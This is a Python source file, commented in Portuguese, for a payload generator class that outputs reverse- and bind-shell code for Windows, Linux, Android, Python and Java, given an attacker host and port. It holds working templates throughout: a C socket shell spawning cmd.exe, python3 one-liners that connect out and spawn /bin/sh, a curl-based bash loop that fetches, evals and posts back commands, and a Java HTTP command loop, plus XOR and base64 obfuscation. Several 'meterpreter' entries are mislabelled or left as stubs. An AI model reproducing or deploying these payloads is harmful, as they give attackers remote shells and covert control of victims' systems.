import base64
import random
import string
from utils.helpers import print_success, print_error

class PayloadGenerator:
    def __init__(self):
        self.current_payload = None
        self.encoding = "plain"
        self.platform = "windows"
        self.protocol = "tcp"
        
        # Dicionário de payloads por plataforma - CORRIGIDO
        self.payloads = {
            "windows": {
                "meterpreter_reverse_tcp": self.generate_windows_meterpreter_tcp,
                "meterpreter_reverse_http": self.generate_windows_meterpreter_http,
                "meterpreter_reverse_https": self.generate_windows_meterpreter_https,
                "meterpreter_bind_tcp": self.generate_windows_meterpreter_bind_tcp,
                "shell_reverse_tcp": self.generate_windows_shell_tcp,
                "shell_bind_tcp": self.generate_windows_shell_bind_tcp,
            },
            "linux": {
                "meterpreter_reverse_tcp": self.generate_linux_meterpreter_tcp,
                "meterpreter_reverse_http": self.generate_linux_meterpreter_http,
                "meterpreter_bind_tcp": self.generate_linux_meterpreter_bind_tcp,
                "shell_reverse_tcp": self.generate_linux_shell_tcp,
                "shell_bind_tcp": self.generate_linux_shell_bind_tcp,
            },
            "android": {
                "meterpreter_reverse_tcp": self.generate_android_meterpreter_tcp,
                "meterpreter_reverse_http": self.generate_android_meterpreter_http,
                "meterpreter_reverse_https": self.generate_android_meterpreter_https,
            },
            "multi": {
                "python_shell_reverse_tcp": self.generate_python_shell_tcp,
                "python_meterpreter_reverse_tcp": self.generate_python_meterpreter_tcp,
                "java_meterpreter_reverse_http": self.generate_java_meterpreter_reverse_http,  # NOME CORRIGIDO
            }
        }
        
    def select_payload(self, payload_type):
        """Seleciona payload baseado no formato 'plataforma/tipo'"""
        try:
            if "/" in payload_type:
                platform, payload_name = payload_type.split("/", 1)
                if platform in self.payloads and payload_name in self.payloads[platform]:
                    self.current_payload = payload_type
                    self.platform = platform
                    print_success(f"Payload selecionado: {payload_type}")
                    return True
                else:
                    print_error(f"Payload não encontrado: {payload_type}")
                    return False
            else:
                print_error("Formato inválido. Use: plataforma/tipo_payload")
                return False
        except Exception as e:
            print_error(f"Erro ao selecionar payload: {e}")
            return False
        
    def set_encoding(self, encoding):
        if encoding in ["plain", "base64", "xor", "aes"]:
            self.encoding = encoding
            print_success(f"Encoding definido para: {encoding}")
            return True
        else:
            print_error("Encoding deve ser: plain, base64, xor ou aes")
            return False
            
    def set_platform(self, platform):
        if platform in ["windows", "linux", "android", "multi"]:
            self.platform = platform
            print_success(f"Plataforma definida para: {platform}")
            return True
        else:
            print_error("Plataforma deve ser: windows, linux, android ou multi")
            return False
            
    def set_protocol(self, protocol):
        if protocol in ["tcp", "udp", "http", "https"]:
            self.protocol = protocol
            print_success(f"Protocolo definido para: {protocol}")
            return True
        else:
            print_error("Protocolo deve ser: tcp, udp, http ou https")
            return False
            
    def list_payloads(self, platform=None):
        """Lista todos os payloads disponíveis"""
        try:
            if platform and platform in self.payloads:
                print(f"\nPayloads disponíveis para {platform}:")
                for payload in self.payloads[platform].keys():
                    print(f"  {platform}/{payload}")
            else:
                print("\nPayloads disponíveis:")
                for platform, payloads in self.payloads.items():
                    print(f"  {platform.upper()}:")
                    for payload in payloads.keys():
                        print(f"    {platform}/{payload}")
            print()
        except Exception as e:
            print_error(f"Erro ao listar payloads: {e}")
                    
    def generate_payload(self, lhost, lport):
        """Gera o payload com os parâmetros especificados"""
        if not self.current_payload:
            print_error("Nenhum payload selecionado. Use 'select_payload' primeiro.")
            return None
            
        try:
            platform, payload_name = self.current_payload.split("/", 1)
            
            if platform not in self.payloads or payload_name not in self.payloads[platform]:
                print_error(f"Payload não suportado: {self.current_payload}")
                return None
                
            generator = self.payloads[platform][payload_name]
            payload = generator(lhost, lport)
            
            if not payload:
                print_error("Falha ao gerar payload")
                return None
            
            # Aplicar encoding
            if self.encoding == "base64":
                payload = base64.b64encode(payload.encode()).decode()
            elif self.encoding == "xor":
                payload = self.xor_encode(payload)
            elif self.encoding == "aes":
                payload = self.aes_encode(payload)
                
            return payload
            
        except Exception as e:
            print_error(f"Erro ao gerar payload: {e}")
            return None
        
    # ========== MÉTODOS DE PAYLOADS WINDOWS ==========
    
    def generate_windows_meterpreter_tcp(self, lhost, lport):
        return f"""
// Windows Meterpreter Reverse TCP - Compile com: gcc -o payload.exe payload.c -lws2_32
#include <Windows.h>
#include <stdio.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

int main() {{
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("{lhost}");
    sa.sin_port = htons({lport});
    
    if (WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {{
        return 1;
    }}
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    
    return 0;
}}
"""
    
    def generate_windows_meterpreter_http(self, lhost, lport):
        return f"""
// Windows Meterpreter Reverse HTTP
#include <Windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

int main() {{
    HINTERNET hInternet, hConnect;
    char buffer[1024];
    DWORD bytesRead;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hConnect = InternetOpenUrl(hInternet, "http://{lhost}:{lport}/connect", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    
    if (!hConnect) return 1;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {{
        // Processar comandos
    }}
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}}
"""
    
    def generate_windows_meterpreter_https(self, lhost, lport):
        return self.generate_windows_meterpreter_http(lhost, lport).replace("http://", "https://")
    
    def generate_windows_meterpreter_bind_tcp(self, lhost, lport):
        return f"""
// Windows Meterpreter Bind TCP
#include <Windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

int main() {{
    WSADATA wsaData;
    SOCKET s, client;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons({lport});
    
    bind(s, (struct sockaddr *)&sa, sizeof(sa));
    listen(s, 1);
    
    client = accept(s, NULL, NULL);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    closesocket(client);
    closesocket(s);
    WSACleanup();
    return 0;
}}
"""
    
    def generate_windows_shell_tcp(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["cmd.exe","-i"])
"""
    
    def generate_windows_shell_bind_tcp(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{lport}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["cmd.exe","-i"])
"""
    
    # ========== MÉTODOS DE PAYLOADS LINUX ==========
    
    def generate_linux_meterpreter_tcp(self, lhost, lport):
        return f"""
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {{
    int sockfd;
    struct sockaddr_in serv_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons({lport});
    inet_pton(AF_INET, "{lhost}", &serv_addr.sin_addr);
    
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}}
"""
    
    def generate_linux_meterpreter_http(self, lhost, lport):
        return f"""
#!/bin/bash
while true; do
    cmd=$(curl -s http://{lhost}:{lport}/get_cmd)
    if [ ! -z "$cmd" ]; then
        result=$(eval "$cmd" 2>&1)
        curl -s -X POST -d "$result" http://{lhost}:{lport}/result
    fi
    sleep 5
done
"""
    
    def generate_linux_meterpreter_bind_tcp(self, lhost, lport):
        return f"""
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {{
    int sockfd, clientfd;
    struct sockaddr_in serv_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons({lport});
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    
    bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    listen(sockfd, 1);
    
    clientfd = accept(sockfd, NULL, NULL);
    
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);
    
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}}
"""
    
    def generate_linux_shell_tcp(self, lhost, lport):
        return f"""
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
"""
    
    def generate_linux_shell_bind_tcp(self, lhost, lport):
        return f"""
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
"""
    
    # ========== MÉTODOS DE PAYLOADS ANDROID ==========
    
    def generate_android_meterpreter_tcp(self, lhost, lport):
        return f"""
// Android Java Reverse TCP
try {{
    String host = "{lhost}";
    int port = {lport};
    Socket socket = new Socket(host, port);
    
    Process process = Runtime.getRuntime().exec("/system/bin/sh");
    DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
    DataInputStream inputStream = new DataInputStream(process.getInputStream());
    DataInputStream errorStream = new DataInputStream(process.getErrorStream());
    
    // Implementar loop de comando aqui
    
}} catch (Exception e) {{
    e.printStackTrace();
}}
"""
    
    def generate_android_meterpreter_http(self, lhost, lport):
        return f"""
// Android HTTP Stager
new Thread(new Runnable() {{
    public void run() {{
        try {{
            while (true) {{
                URL url = new URL("http://{lhost}:{lport}/stage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                // Implementar stager HTTP
                Thread.sleep(5000);
            }}
        }} catch (Exception e) {{}}
    }}
}}).start();
"""
    
    def generate_android_meterpreter_https(self, lhost, lport):
        return self.generate_android_meterpreter_http(lhost, lport).replace("http://", "https://")
    
    # ========== MÉTODOS DE PAYLOADS MULTI-PLATAFORMA ==========
    
    def generate_python_shell_tcp(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
    
    def generate_python_meterpreter_tcp(self, lhost, lport):
        return f"""
import socket
import subprocess
import os
import struct

# Python Meterpreter Stager
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))

# Receber e executar estágios do Meterpreter
# (Implementação simplificada)
"""
    
    def generate_java_meterpreter_reverse_http(self, lhost, lport):
        """Método Java Meterpreter HTTP que estava faltando"""
        return f"""
import java.net.*;
import java.io.*;

public class JavaMeterpreterHTTP {{
    public static void main(String[] args) {{
        try {{
            String host = "{lhost}";
            int port = {lport};
            
            while (true) {{
                try {{
                    URL url = new URL("http://" + host + ":" + port + "/stage");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder content = new StringBuilder();
                    
                    while ((inputLine = in.readLine()) != null) {{
                        content.append(inputLine);
                    }}
                    in.close();
                    
                    // Executar comando recebido
                    if (content.length() > 0) {{
                        Process process = Runtime.getRuntime().exec(content.toString());
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        
                        StringBuilder result = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {{
                            result.append(line).append("\\n");
                        }}
                        
                        // Enviar resultado de volta
                        URL resultUrl = new URL("http://" + host + ":" + port + "/result");
                        HttpURLConnection resultConn = (HttpURLConnection) resultUrl.openConnection();
                        resultConn.setRequestMethod("POST");
                        resultConn.setDoOutput(true);
                        
                        OutputStreamWriter writer = new OutputStreamWriter(resultConn.getOutputStream());
                        writer.write(result.toString());
                        writer.flush();
                        writer.close();
                    }}
                    
                    Thread.sleep(5000);
                }} catch (Exception e) {{
                    Thread.sleep(30000); // Esperar mais em caso de erro
                }}
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
"""
    
    # ========== MÉTODOS DE ENCODING ==========
    
    def xor_encode(self, data):
        """Codifica dados usando XOR"""
        try:
            key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
            encoded = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
            return f"""
# XOR Encoded Payload
key = "{key}"
encoded = "{encoded}"
exec(''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded)))
"""
        except Exception as e:
            print_error(f"Erro no encoding XOR: {e}")
            return data
    
    def aes_encode(self, data):
        """Codifica dados usando AES (simplificado)"""
        try:
            # Fallback para base64 se Crypto não estiver disponível
            return base64.b64encode(data.encode()).decode()
        except Exception as e:
            print_error(f"Erro no encoding AES: {e}")
            return data
    
    def save_to_file(self, payload, filename):
        """Salva o payload em um arquivo"""
        try:
            with open(filename, 'w') as f:
                f.write(payload)
            print_success(f"Payload salvo em: {filename}")
            return True
        except Exception as e:
            print_error(f"Erro ao salvar arquivo: {e}")
            return False
